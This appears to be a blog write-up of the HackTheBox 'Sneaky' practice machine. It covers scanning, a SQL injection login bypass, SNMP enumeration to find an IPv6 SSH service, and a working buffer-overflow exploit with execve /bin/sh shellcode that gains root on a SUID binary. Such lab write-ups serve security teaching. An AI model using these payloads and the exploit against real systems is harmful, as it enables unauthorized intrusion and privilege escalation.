---
title: Sneaky - HackTheBox
published: true
---
![](assets/img/sneaky-htb/icon.png)

**Hey Guys!** In this blogpost, we are going to pwn **Sneaky** from [HackTheBox](https://www.hackthebox.eu). Before that, let me give you a brief overview of what exactly we are going to do :

*   First, we scan the box to find a website.
*   Then, a simple fuzz reveals an interesting directory which leads us to a login page.
*   Bypassing the login page via a simple SQLi, we find a SSH Key.
*   Since we do not have any SSH port open, we go back to our scanning phase to find a SNMP service.
*   Finding a juicy information from SNMP enumeration, we make our entry to the box.
*   Then a classic buffer overflow to escalate our privileges as root.

With that said, let us begin.

# [](#header-1)SCANNING:

```
root@kali:~# nmap -sC -sV 10.10.10.20
Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-01 00:00 EST
Nmap scan report for 10.10.10.20
Host is up (0.29s latency).
Not shown: 999 closed ports
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
|_http-server-header: Apache/2.4.7 (Ubuntu)
|_http-title: Under Development!

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.65 seconds
```

Doing a service version scan (-sV) and default script scan (-sC) of the box, we find **HTTP** service to be open.

**Apache httpd 2.4.7** is running on port 80.

Let us now enumerate the found service.

# [](#header-1)ENUMERATING HTTP:

Visiting the website by the browser, we get:

![](assets/img/sneaky-htb/web-1.png)

Finding nothing interesting, I decided to fuzz for some directories/files.

```
root@kali:~# gobuster dir -u http://10.10.10.20 -w /usr/share/wordlists/dirb/big.txt -t 30
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.20
[+] Threads:        30
[+] Wordlist:       /usr/share/wordlists/dirb/big.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2021/03/01 00:02:01 Starting gobuster
===============================================================
/.htpasswd (Status: 403)
/.htaccess (Status: 403)
/dev (Status: 301)
/server-status (Status: 403)
===============================================================
2021/03/01 00:05:15 Finished
===============================================================
```

We do find an interesting directory `/dev`. 

![](assets/img/sneaky-htb/web-2.png)

Interesting! We got a login page.

![](assets/img/sneaky-htb/web-3.png)

The box gives `Not Found:` response when I try to give a dummy credential like `test:test`. Perhaps, it is the response for failed login attempt.

First thing I do when I see a login page is check for SQL injection.

![](assets/img/sneaky-htb/web-4.png)

We get an `Internal Server Error` when I entered `'` on both the username and password field. So, there is some sort of SQL injection here.

Now let us see if we can bypass the login using OR-based SQL injection.

Username : `admin' or 1=1 -- - `

Password : `admin' or 1=1 -- - `

![](assets/img/sneaky-htb/web-5.png)

And we are in!

Now let us see what this `My Key` got for us.

![](assets/img/sneaky-htb/web-6.png)

Okay! We have a **SSH private key** here. But wait! we did not find any SSH port to be open.

Probably, we missed something in the scanning phase. Let us find out what it is.

# [](#header-1)BACK TO SCANNING:

```
root@kali:~# nmap -sU -sV 10.10.10.20
Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-01 00:29 EST
Nmap scan report for 10.10.10.20
Host is up (0.29s latency).
Not shown: 998 closed ports
PORT      STATE         SERVICE VERSION
161/udp   open          snmp    SNMPv1 server; net-snmp SNMPv3 server (public)
Service Info: Host: Sneaky

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1111.34 seconds
```

I did an UDP scan on 1000 ports and found port 161 to be open. We have **SNMP** running on the found port.

If you do not know what that is, Simple Network Management Protocol (SNMP) is an application-layer protocol for monitoring and managing network devices on a local area network (LAN) or wide area network (WAN). The purpose of SNMP is to provide network devices such as routers, servers and printers with a common language for sharing information with a network management system (NMS).

Sometimes, if we are lucky we might get some juicy information using **SNMP**.

# [](#header-1)ENUMERATING SNMP:

To enumerate SNMP, we first need to find the **community string** that the box is using. Fortunately, we have a tool called `onesixtyone` that is particularly used to brute force for community strings.

```
root@kali:~# onesixtyone 10.10.10.20
Scanning 1 hosts, 2 communities
10.10.10.20 [public] Linux Sneaky 4.4.0-75-generic #96~14.04.1-Ubuntu SMP Thu Apr 20 11:06:56 UTC 2017 i686
```

We found the community string to be `public`. Well that was pretty guessable ;)

Now that we found the community string, we can dump some SNMP data from the box using a tool called **snmpwalk**.

`snmpwalk -v2c -c public 10.10.10.20`

```
IP-FORWARD-MIB::inetCidrRouteAge.ipv4."0.0.0.0".0.2.0.0.ipv4."10.10.10.2" = Gauge32: 0
IP-FORWARD-MIB::inetCidrRouteAge.ipv4."10.10.10.0".24.3.0.0.2.ipv4."0.0.0.0" = Gauge32: 0
IP-FORWARD-MIB::inetCidrRouteAge.ipv6."00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00".0.3.0.0.4.ipv6."fe:80:00:00:00:00:00:00:02:50:56:ff:fe:b9:cf:58" = Gauge32: 0
IP-FORWARD-MIB::inetCidrRouteAge.ipv6."00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:01".128.3.0.0.6.ipv6."00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00" = Gauge32: 0
IP-FORWARD-MIB::inetCidrRouteAge.ipv6."de:ad:be:ef:00:00:00:00:02:50:56:ff:fe:b9:c0:85".128.3.0.0.7.ipv6."00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00" = Gauge32: 0
IP-FORWARD-MIB::inetCidrRouteAge.ipv6."fe:80:00:00:00:00:00:00:00:00:00:00:00:00:00:00".64.3.0.0.3.ipv6."00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00" = Gauge32: 0
IP-FORWARD-MIB::inetCidrRouteAge.ipv6."fe:80:00:00:00:00:00:00:02:50:56:ff:fe:b9:c0:85".128.3.0.0.8.ipv6."00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00" = Gauge32: 0
IP-FORWARD-MIB::inetCidrRouteAge.ipv6."ff:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00".8.3.0.0.9.ipv6."00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00" = Gauge32: 0
IP-FORWARD-MIB::inetCidrRouteNextHopAS.ipv4."0.0.0.0".0.2.0.0.ipv4."10.10.10.2" = Gauge32: 0
```

The output is going to be too big. So I am just showing the part that is useful.

While enumerating, I found the IPv6 address of the box. It might be possible that we find some lead to move forward from that.

`de:ad:be:ef:00:00:00:00:02:50:56:ff:fe:b9:c0:85`

Since, IPv6 addresses are 128 bit long and have 8 octets, we need to convert it to a suitable form.

Actual IPv6 address would be : `dead:beef:0000:0000:0250:56ff:feb9:c085`.

Now let us do a NMAP scan of the IPv6 address.

```
root@kali:~# nmap -6 dead:beef:0000:0000:0250:56ff:feb9:c085
Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-01 00:56 EST
Nmap scan report for dead:beef::250:56ff:feb9:c085
Host is up (0.84s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 4.84 seconds
```

As you can see, now we have an SSH port open.

# [](#header-1)SHELL AS THRASIVOULOS:

We have a SSH private key and a username. You know what to do now :)

```
root@kali:~# chmod 600 sshkeyforadministratordifficulttimes 
root@kali:~# ssh -i sshkeyforadministratordifficulttimes thrasivoulos@dead:beef:0000:0000:0250:56ff:feb9:c085
load pubkey "sshkeyforadministratordifficulttimes": invalid format
The authenticity of host 'dead:beef::250:56ff:feb9:c085 (dead:beef::250:56ff:feb9:c085)' can't be established.
ECDSA key fingerprint is SHA256:KCwXgk+ryPhJU+UhxyHAO16VCRFrty3aLPWPSkq/E2o.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'dead:beef::250:56ff:feb9:c085' (ECDSA) to the list of known hosts.
Welcome to Ubuntu 14.04.5 LTS (GNU/Linux 4.4.0-75-generic i686)

 * Documentation:  https://help.ubuntu.com/

  System information as of Mon Mar  1 07:01:38 EET 2021

  System load: 0.0               Memory usage: 4%   Processes:       176
  Usage of /:  9.9% of 18.58GB   Swap usage:   0%   Users logged in: 0

  Graph this data and manage this system at:
    https://landscape.canonical.com/

Your Hardware Enablement Stack (HWE) is supported until April 2019.
Last login: Sun May 14 20:22:53 2017 from dead:beef:1::1077
thrasivoulos@Sneaky:~$ id && hostname
uid=1000(thrasivoulos) gid=1000(thrasivoulos) groups=1000(thrasivoulos),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lpadmin),111(sambashare)
Sneaky
thrasivoulos@Sneaky:~$ 
```

And now you can read the user flag.

# [](#header-1)PRIVILEGE ESCALATION:

Let us begin by checking **SUID** bit set files.

```
thrasivoulos@Sneaky:~$ find / -type f -perm -4000 2>/dev/null
/bin/umount
/bin/su
/bin/mount
/bin/ping6
/bin/fusermount
/bin/ping
/usr/local/bin/chal
/usr/sbin/uuidd
/usr/sbin/pppd
/usr/bin/at
/usr/bin/pkexec
/usr/bin/traceroute6.iputils
/usr/bin/chsh
/usr/bin/gpasswd
/usr/bin/passwd
/usr/bin/mtr
/usr/bin/newgrp
/usr/bin/sudo
/usr/bin/chfn
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/eject/dmcrypt-get-device
```

We do find an odd binary `/usr/local/bin/chal`.

```
thrasivoulos@Sneaky:~$ ls -l /usr/local/bin/chal 
-rwsrwsr-x 1 root root 7301 May  4  2017 /usr/local/bin/chal
```

It is owned by **root**. This might be our way.

Let us save the binary in our local box and start playing with it a bit.

```
root@kali:~# ./chal 
Segmentation fault
root@kali:~# ./chal $(python -c "print 'A' * 500")
Segmentation fault
root@kali:~# ./chal test1234
root@kali:~# 
```

When we simply run the binary, we get a **segmentation fault**. May be the binary needs a command-line-argument. Next, when we run the binary with a CLI of sufficiently large length, we get a **segmentation fault** again. There is indeed a **buffer overflow**.

Now let us calculate the offset for  **Buffer Overflow**.

```
root@kali:~# cyclic 500
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaadzaaebaaecaaedaaeeaaefaaegaaehaaeiaaejaaekaaelaaemaaenaaeoaaepaaeqaaeraaesaaetaaeuaaevaaewaaexaaeyaae
root@kali:~# gdb ./chal -q
pwndbg: loaded 193 commands. Type pwndbg [filter] for a list.
pwndbg: created $rebase, $ida gdb functions (can be used with print/break)
Reading symbols from ./chal...
(No debugging symbols found in ./chal)
pwndbg> r aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaadzaaebaaecaaedaaeeaaefaaegaaehaaeiaaejaaekaaelaaemaaenaaeoaaepaaeqaaeraaesaaetaaeuaaevaaewaaexaaeyaae
Starting program: /root/chal aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaadzaaebaaecaaedaaeeaaefaaegaaehaaeiaaejaaekaaelaaemaaenaaeoaaepaaeqaaeraaesaaetaaeuaaevaaewaaexaaeyaae

Program received signal SIGSEGV, Segmentation fault.
0x61716461 in ?? ()
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
───────────────────────────────────────────────────────────────────────────────[ REGISTERS ]───────────────────────────────────────────────────────────────────────────────
 EAX  0x0
 EBX  0x0
 ECX  0xffffd4b0 ◂— 'eyaae'
 EDX  0xffffd0f1 ◂— 'eyaae'
 EDI  0xf7fb0000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1e4d6c
 ESI  0xf7fb0000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1e4d6c
 EBP  0x61706461 ('adpa')
 ESP  0xffffd070 ◂— 'adraadsaadtaaduaadvaadwaadxaadyaadzaaebaaecaaedaaeeaaefaaegaaehaaeiaaejaaekaaelaaemaaenaaeoaaepaaeqaaeraaesaaetaaeuaaevaaewaaexaaeyaae'
 EIP  0x61716461 ('adqa')
────────────────────────────────────────────────────────────────────────────────[ DISASM ]─────────────────────────────────────────────────────────────────────────────────
Invalid address 0x61716461
```

I have created a **cyclic** pattern of length **200**. Then I ran the binary in **GDB** with the cyclic input. Expectedly, we get a **segmentation fault** at **0x61716461** that represents the string `'adqa'`.

```
root@kali:~# cyclic -l adqa
362
```

We find the **offset** to be at **362**.

```
root@kali:~# checksec chal
[*] '/root/chal'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments
```

That is gonna be a super easy **Buffer Overflow**. Since **NX** bit is disabled, we can place a **shellcode** in the buffer and direct the execution flow to the start of **shellcode**.

Let us build our exploit now.

```python
BUFF_LEN = 362
shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
nop_sled = '\x90' * (BUFF_LEN - len(shellcode))
EIP = ?????

payload = nop_sled + shellcode + EIP
print payload
```

First we define the buffer length as **362**.

Then we define the shellcode. I am using a **32 bit execve /bin/sh** shellcode. You can find it [here](https://www.exploit-db.com/shellcodes/46809).

Then we build the **NOP-sled** whose length is 362 minus the length of **shellcode**.

Then we define the payload as : 
### payload = NOP Sled + Shellcode + EIP

But wait! We did not specified the **EIP** with the address that we are going to return.

Let us again run the binary in **GDB** and find a suitable return address.

```
thrasivoulos@Sneaky:~$ gdb /usr/local/bin/chal -q
Reading symbols from /usr/local/bin/chal...(no debugging symbols found)...done.
(gdb) r $(python -c "print 'A' * 400")
Starting program: /usr/local/bin/chal $(python -c "print 'A' * 400")

Program received signal SIGSEGV, Segmentation fault.
0x41414141 in ?? ()
(gdb) x/200xw $esp
0xbffff540:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffff550:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffff560:     0x08004141      0xb7fce000      0x00000000      0x00000000
0xbffff570:     0x00000000      0x5dbe20db      0x6521c4cb      0x00000000
0xbffff580:     0x00000000      0x00000000      0x00000002      0x08048320
0xbffff590:     0x00000000      0xb7ff24c0      0xb7e3ba09      0xb7fff000
0xbffff5a0:     0x00000002      0x08048320      0x00000000      0x08048341
0xbffff5b0:     0x0804841d      0x00000002      0xbffff5d4      0x08048450
0xbffff5c0:     0x080484c0      0xb7fed160      0xbffff5cc      0x0000001c
0xbffff5d0:     0x00000002      0xbffff6fe      0xbffff712      0x00000000
0xbffff5e0:     0xbffff8a3      0xbffff8b4      0xbffff8c4      0xbffff8d8
0xbffff5f0:     0xbffff8fe      0xbffff911      0xbffff923      0xbffffe44
0xbffff600:     0xbffffe50      0xbffffeae      0xbffffeca      0xbffffed9
0xbffff610:     0xbffffef0      0xbfffff01      0xbfffff0a      0xbfffff22
0xbffff620:     0xbfffff2a      0xbfffff3f      0xbfffff87      0xbfffffa7
0xbffff630:     0xbfffffc6      0x00000000      0x00000020      0xb7fdccf0
0xbffff640:     0x00000021      0xb7fdc000      0x00000010      0x078bfbff
0xbffff650:     0x00000006      0x00001000      0x00000011      0x00000064
0xbffff660:     0x00000003      0x08048034      0x00000004      0x00000020
0xbffff670:     0x00000005      0x00000009      0x00000007      0xb7fde000
0xbffff680:     0x00000008      0x00000000      0x00000009      0x08048320
0xbffff690:     0x0000000b      0x000003e8      0x0000000c      0x000003e8
0xbffff6a0:     0x0000000d      0x000003e8      0x0000000e      0x000003e8
0xbffff6b0:     0x00000017      0x00000001      0x00000019      0xbffff6db
0xbffff6c0:     0x0000001f      0xbfffffe8      0x0000000f      0xbffff6eb
0xbffff6d0:     0x00000000      0x00000000      0x3e000000      0x50234989
0xbffff6e0:     0xcfd2512a      0x7501aeb2      0x6996cc7d      0x00363836
0xbffff6f0:     0x00000000      0x00000000      0x00000000      0x752f0000
0xbffff700:     0x6c2f7273      0x6c61636f      0x6e69622f      0x6168632f
0xbffff710:     0x4141006c      0x41414141      0x41414141      0x41414141
0xbffff720:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffff730:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffff740:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffff750:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffff760:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffff770:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffff780:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffff790:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffff7a0:     0x41414141      0x41414141      0x41414141      0x41414141
---Type <return> to continue, or q <return> to quit---
0xbffff7b0:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffff7c0:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffff7d0:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffff7e0:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffff7f0:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffff800:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffff810:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffff820:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffff830:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffff840:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffff850:     0x41414141      0x41414141      0x41414141      0x41414141
(gdb) 
```

I have printed the 200 words in hex that are present on the stack. We can also see the bunch of **A**'s that we gave as input starting at address `0xbffff712`. 

Now let us select an address roughly from the middle of the buffer, `0xbffff7c0`, and assign it as return address to the **EIP**.

Our final exploit will be :

```python
BUFF_LEN = 362
shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
nop_sled = '\x90' * (BUFF_LEN - len(shellcode))
#Return Address is 0xbffff7c0
EIP = '\xc0\xf7\xff\xbf'

payload = nop_sled + shellcode + EIP
print payload
```

Let us now copy the exploit on the box and run it.

```
thrasivoulos@Sneaky:~$ /usr/local/bin/chal $(python exploit.py)
# id
uid=1000(thrasivoulos) gid=1000(thrasivoulos) euid=0(root) egid=0(root) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lpadmin),111(sambashare),1000(thrasivoulos)
# hostname
Sneaky
# cd /root
# ls 
root.txt
# 
```

And that is it, we are successful in exploitting the binary and get **root**. Now you can read the root flag too.

So that was **Sneaky** from **HackTheBox**.

**Thanks** for reading this far. Hope you liked it.

I will see you in the next writeup. **PEACE**